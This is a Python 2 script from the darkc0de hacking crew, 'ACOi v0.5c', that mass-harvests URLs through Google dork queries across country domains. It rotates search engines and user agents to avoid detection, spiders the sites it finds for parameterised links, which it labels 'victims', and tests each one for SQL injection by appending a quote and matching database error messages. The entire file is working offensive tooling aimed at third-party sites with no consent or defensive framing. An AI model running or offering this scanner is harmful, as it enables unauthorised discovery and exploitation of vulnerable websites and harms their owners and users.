#!/usr/bin/env python 
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# Avoiding Conflicts Of Interest
# ACOi v0.5c // low1z // forum.darkc0de.com
#
# darkc0de Crew 
# www.darkc0de.com 
# code low1z
# 
# Greetz to 
# d3hydr8, rsauron, baltazar, inkubus, kopele
# and the rest of the Darkc0de members 
#
# advice: dont change what you dont fully understand.
#

import urllib, urllib2, sys, re, os, time, string, commands, socket, cookielib, random, threading, sets

timeout = 2
socket.setdefaulttimeout(timeout)

global uniqvictims,spidervictims,miscVic
uniqvictims = []
spidervictims = []
testedvictims = []
spiderSuccess = []
miscVic = []
tSc = []
finalList = []
targets = []

threads = []
numthreads = 8

maxcount = 500
gnum = 100
rSA = [2,3,4,5,6]

version = '0.5c'   # 0.0a - 1.0f
ldm = 'may-29-09'

FType = { 'asp': '300',
	  'aspx': '200',
	  'jsp': '250',
	  'cgi': '300',
          'php': '500',
          'cfm': '300'}

dorkEXT = 'php'                     # << change this corresponding to FType, other filetypes require you to extend FType
maxFoundBase = FType[dorkEXT]
dork = '"*.'+dorkEXT+'?id="'

SQLeD = {'MySQL': 'error in your SQL syntax',
	 'MiscError': 'SQL Error',
         'Oracle': 'ORA-01756',
	 'JDBC_CFM': 'Error Executing Database Query',
	 'JDBC_CFM2': 'SQLServer JDBC Driver',
	 'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
	 'MSSQL_Uqm': 'Unclosed quotation mark',
	 'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
         'MS-Access_JETdb': 'Microsoft JET Database'}

siteDic = {'Europe-1': ['is','ie','uk','no','fi','dk','pl'],
	   'Europe-2': ['de','fr','nl','be','lu','cz','at'],
	   'Europe-3': ['it','es','pt','gr','tr','sk','rs'],
	   'TopLevel': ['com','net','org','biz','info','edu'],
	   'TLDmisc1': ['asia','aero','int','jobs','mobi'],
	   'TLDmisc2': ['travel','tel','pro','name','coop'],
	   'AsianTLD': ['jp','cn','tw','kr','th','in','pk','my','ph'],
	   'South-Am': ['ar','br','cl','bo','ec','mx','pe']}

header = ['Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
          'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
          'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
          'Microsoft Internet Explorer/4.0b1 (Windows 95)',
          'Opera/8.00 (Windows NT 5.1; U; en)']

CXdic = {'blackle ': '013269018370076798483:gg7jrrhpsy4',
         'ssearch ': '008548304570556886379:0vtwavbfaqe',
	 'redfront': '017478300291956931546:v0vo-1jh2y4',
         'bitcomet': '003763893858882295225:hz92q2xruzy',
         'daPirats': '002877699081652281083:klnfl5og4kg',
	 'darkc0de': '009758108896363993364:wnzqtk1afdo',
         'googuuul': '014345598409501589908:mplknj4r1bu'}

def StripTags(text):
	return re.sub(r'<[^>]*?>','', text)

def getSecs():
	secs = time.time()
	return secs

def gharv(magicWord):
	vUniq = []
	for site in sitearray:
		counter = 0;bcksp = 0
		try:
			CXname = CXdic.keys()[int(random.random()*len(CXdic.keys()))];CXr = CXdic[CXname]
			print "\n| Site : ", site, " | CSEngine : ", CXname+" | Progress : ",
			saveCount = len(targets);cmpslptime = 0;lastlen = 0
			while counter < maxcount:
				jar = cookielib.FileCookieJar("cookies")
				query = magicWord+'+'+dork+'+site:'+site
			        results_web = 'http://www.google.com/cse?cx='+CXr+'&q='+query+'&num='+str(gnum)+'&hl=en&lr=&ie=UTF-8&start=' + repr(counter) + '&sa=N'
			        request_web = urllib2.Request(results_web);agent = random.choice(header)
			        request_web.add_header('User-Agent', agent);opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
			        text = opener_web.open(request_web).read();strreg = re.compile('(?<=href=")(.*?)(?=")')
				names = strreg.findall(text)
			        for name in names:
					if name not in targets:
						if re.search(r'\(', name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
							pass
						elif re.search("google", name) or re.search("youtube", name) or re.search(".gov", name):
							pass
			                        else:
							targets.append(name)
				sleeptimer = random.choice(rSA);time.sleep(sleeptimer)
				cmpslptime += sleeptimer;counter += gnum
				percent = int((1.0*counter/maxcount)*100)
				if bcksp == 1:
					stroutlen = 0
					while stroutlen < lastlen:
						sys.stdout.write("\10");stroutlen += 1
				sys.stdout.write("%s(%s) - %s percent" % (counter,sleeptimer,percent))
				lastlen = len(str(counter)+str(sleeptimer)+str(percent))+13
				sys.stdout.flush()
				bcksp = 1
			sys.stdout.write(" | %s Strings recieved, in %s seconds" % (len(targets)-saveCount,cmpslptime))
		except IOError:
			sys.stdout.write(" | %s Strings recieved" % (len(targets)-saveCount))
	firstparm = '';uList = []
	for entry in targets:
	        thost = entry.rsplit("=");t2host = entry.rsplit("/")
	        try:
	                firstparm = thost[1];domain = t2host[2]
	                if domain not in uList:
	                        if '.'+dorkEXT+'?' in entry and firstparm.isdigit() == True:
	                                uniqvictims.append(entry);uList.append(domain)
	                                pass
	                        elif 'http://' in entry and 'index.' in entry and firstparm.isalpha() == True:
	                                spidervictims.append(entry);uList.append(domain)
	                                pass
	                        else:
	                                miscVic.append(entry)
	                                pass
	        except:
	                pass
# ScanQueue Builder

def prepQueue():
	tmpL = []
	ScanQueue = [];vList = spidervictims + uniqvictims + miscVic
	for entry in vList:
		tentry = entry.rsplit('=',1)
		dentry = entry.rsplit('/')
		if tentry[0] not in testedvictims and dentry[2] not in tmpL:
			ScanQueue.append(entry)
			tmpL.append(dentry[2])
		else:
			pass
	return ScanQueue

def cleanMainLists():
	doubles = []
	for entry in spidervictims:
		tmp1 = entry.rsplit('=')
		if tmp1[0] not in doubles:
			doubles.append(tmp1[0])
		else:
			spidervictims.remove(entry)
	for entry in uniqvictims:
		tmp2 = entry.rsplit('=')
                if tmp2[0] not in doubles:
                        doubles.append(tmp2[0]) 
                else:
                        uniqvictims.remove(entry)
        for entry in miscVic:
                tmp2 = entry.rsplit('=')
                if tmp2[0] not in doubles:
                        doubles.append(tmp2[0])
                else:
                        miscVic.remove(entry)

def f_List():
	tmpFL = [];tmp2FL = []
	global uniqvictims,spidervictims,miscVic
        for entry in (uniqvictims + spidervictims):
		tentry = entry.rsplit('=')
		if tentry[0] not in tmpFL:
			tmpFL.append(tentry[0])
			finalList.append(entry)
        uniqvictims = [];spidervictims = [];miscVic = []

# spider function

def spider(url):
        sVic = [];lastlen = 0
        host = url.rsplit('/')
        try:
	        request_web = urllib2.Request(url);agent = random.choice(header)
	        request_web.add_header('User-Agent', agent);opener_web = urllib2.build_opener()
		text = opener_web.open(request_web).read();strreg = re.compile('(?<=href=")(.*?)(?=")')
                spiderSuccess.append(host[2]);names = strreg.findall(text)
		opener_web.close()
                for name in names:
			if '?' in name and '=' in name and 'http' not in name and './' not in name:
				if name[0:1] != "/":
			        	name = host[0]+"/"+name
			        else:
				       	name = lhost[0]+'//'+lhost[2]+name
                	if name not in targets:
                        	if re.search(r'\(', name) or re.search('<', name) or re.search('\A/', name) or re.search('\A(http://)\d', name) or re.search('viewtopic', name):
                                	pass
                                elif re.search('google', name) or re.search('ebay', name) or re.search('youtube', name) or re.search('.gov', name) or re.search('facebook', name):
                                	pass
                                else:
                                        tSc.append(name);firstparm = ''
                                        thost = name.rsplit("=")
                                        try:
                                        	firstparm = thost[1]


                                        except:
                                        	pass
					try:
						part = name.split('?')
						var = part[1].split('&')
						cod = ""
						for x in var:
							str = x.split("=")
							cod += str[0]
						parsedurl = part[0]+cod
					except:
						parsedurl = name
                                        if parsedurl not in sVic and thost[0] not in testedvictims:
                                                if 'http://' in name and '.'+dorkEXT+'?' in name and firstparm.isdigit() == True:
                                                        if name not in uniqvictims:
                                                        	uniqvictims.append(name);sVic.append(parsedurl)
                                                elif 'http://' in name and '.'+dorkEXT+'?' in name and firstparm.isalpha() == True:
                                                        if name not in spidervictims:
                                                        	spidervictims.append(name);sVic.append(parsedurl)
                                                elif 'http://' in name and name.count('.') > 2 and ( re.search('php', name) or re.search('asp', name) or re.search('index.', name)):
                                                        if name not in miscVic:
	                                                	miscVic.append(name);sVic.append(parsedurl)
						else:
                                                        pass
	except (ValueError):
		raise
	except:
                pass

class spiderThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts; self.fcount = 0
		self.starttime = getSecs()
		self.crawling = True
		threading.Thread.__init__(self)

        def run (self):
                urls = list(sets.Set(self.hosts))
	        for url in urls:
	                try:
       	        		turl = url.rsplit('=')
              	                if turl[0] not in testedvictims:
	                        	testedvictims.append(turl[0])
				if self.crawling == True:
	                             	spider(url)
				else:
					break
			except(KeyboardInterrupt,ValueError):
                        	testedvictims.append(turl[0])
				pass
		self.fcount+=1

	def stop(self):
		self.crawling = False

class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts;self.fcount = 0
		self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(sets.Set(self.hosts))
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
				finalList.remove(url)
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False

def ClassicINJ(url):
	try:
		finalList.remove(url)
	except(ValueError):
		pass
        EXT = "'"
        host = url+EXT
	try:
	       	source = urllib2.urlopen(host).read()
		for type,eMSG in SQLeD.items():
	        	if re.search(eMSG, source):
	                	print "V. Found:", host, "Error Type:", type
	                else:
				pass
	except:
		pass

startSecs = getSecs()
stecnt = 0

print "     _____ _____ _____ _    **darkc0de ONLY**" 
print "|   |  _  |     |     |_|   code: low1z"
print "|   |     |   --|  |  | |   modified:", ldm
print "|   |__|________|_____|_|   version:", version
print "|"

if len(sys.argv) <= 1:
	print "| Choose your Scanning Location:"
	for key,value in siteDic.items():
		stecnt += 1
		print "\n| "+str(stecnt)+" : "+key+" :\t",
		for val in value:print val,
	sitekey = raw_input('\n| List Number: ')
	sitearray =  siteDic[siteDic.keys()[int(sitekey)-1]]
else:
	sitearray = [];sitearray.append(sys.argv[1])
	maxcount = (maxcount * 2)

print "| Dork                 :", dork
print "| Sites                :",
for entry in sitearray: print entry,
print "\n| Custom Google Engines:",
for cxs in CXdic: print cxs,
print "\n| Results per Page     :",gnum
print "| Max Resuts           :",maxcount
print "|"
print "| - gathering initial spider input -"
magicWord = raw_input('MAGIC WORD : ')
gharv(magicWord)
print "\n";sQ = ''
ScanQueue = prepQueue()
f_List()
maxFound = int(maxFoundBase)
while sQ != 'exit':
	cleanMainLists()
	print "\n+------| ACOi_spider |------------------------------------------------>>"
	print "|"
	print "|  [1] Threaded Spidering :", len(ScanQueue), "(Sites ready)"
	print "|  [2] Print final List (",len(finalList), ") Entries"
	print "|  [3] List URL's in ScanQueue"
	print "|  [4] Save Final List to File"
	print "|  [5] Check Injectability (basic)"
	print "|  [0] Exit"
	print "|"
	print "|  MaxThreads          :", numthreads
	print "|  dorkType / maxFound :", dorkEXT, "/", maxFound
	print "|  spider Tick-Rate    :", (2*int(maxFound / 100)), "sec's"
	print "|"
	print "|  Queried URLs        :", len(spiderSuccess)
	print "|  Checked URL Strings :", len(tSc)
	print "|  Found (total)       :", len(finalList)
	print "+--------------------------------------------------->>"
	print "|  Valid Collected URLs:", len(finalList)
	print "+-------------------------------------------->>\n"
	sQ=raw_input("[1|2|3|4|5|0] ")
	if sQ == '1':
		if len(ScanQueue) == 0:
			print "ScanQueue is empty, wanna supply an url to spider for further links?"
			nUrl = raw_input('new Link: ')
			try:
				spider(nUrl)
			except:
				print "oh my something wrong with the url supplied :-/"
		try:
			lastSQlen = 0
	                while len(uniqvictims + spidervictims) <= maxFound:
				if len(ScanQueue) == 0 or lastSQlen == len(ScanQueue):
					break
	                        i = len(ScanQueue) / int(numthreads)
	                        if len(threads) <= numthreads:
	                                for x in range(0, int(numthreads)):
	                                        if (x-1) == int(numthreads):
	                                                sliced = ScanQueue[x*i:]
	                                        else:
	                                                sliced = ScanQueue[x*i:(x+1)*i]
	                                        thread = spiderThread(sliced)
	                                        thread.start()
	                                        threads.append(thread)

	                        time.sleep(4*int(maxFound / 100)) # file related max values
				lastSQlen = len(ScanQueue)
				ScanQueue = prepQueue()
				sys.stdout.write("SpiderSuccess:%s / uniqVictims: %s / spidervictims: %s / ScanQueue: %s / testedvictims: %s / ActThreads: %s / CheckedStings: %s\n" % (len(spiderSuccess),len(uniqvictims),len(spidervictims),len(ScanQueue),len(testedvictims),len(threads),len(tSc)))
		except(KeyboardInterrupt):
			for tindex in threads:
				tindex.stop();threads.remove(tindex)
			ScanQueue = prepQueue()
			f_List()
		for tindex in threads:
                	tindex.stop();threads.remove(tindex)
		f_List()
	elif sQ == '2':
                finalList.sort()
                for entry in finalList:
                        print entry
	elif sQ == '3':
		for entry in ScanQueue:
			print entry
	elif sQ == '4':
		print "| Saving finalList("+str(len(finalList))+") to Disk"
		fN = raw_input('| Filename : ');fNp = open(fN, 'w');finalList.sort()
		for entry in finalList:
			fNp.write(entry+'\n')
		fNp.close()
		print "| List saved, check", fN
	elif sQ == '5':
		print "Testing", len(finalList), "Hosts\n"
		while len(finalList) >= numthreads:
			i = len(finalList) / int(numthreads)
	                if len(threads) <= numthreads:
	                	for x in range(0, int(numthreads)):
	                        	if (x-1) == int(numthreads):
	                                	sliced = finalList[x*i:]
	                                else:
	                                	sliced = finalList[x*i:(x+1)*i]
	                                thread = injThread(sliced)
	                                thread.start()
	                                threads.append(thread)
			time.sleep(0.1)
	elif sQ == '0':
		sQ = 'exit'
		endSecs = getSecs()
		print "\nPure Processor Runtime :", int(((endSecs - startSecs) / 60)), "Minutes"
		print "had fun? visit www.darkc0de.com\n"
		sys.exit(1)
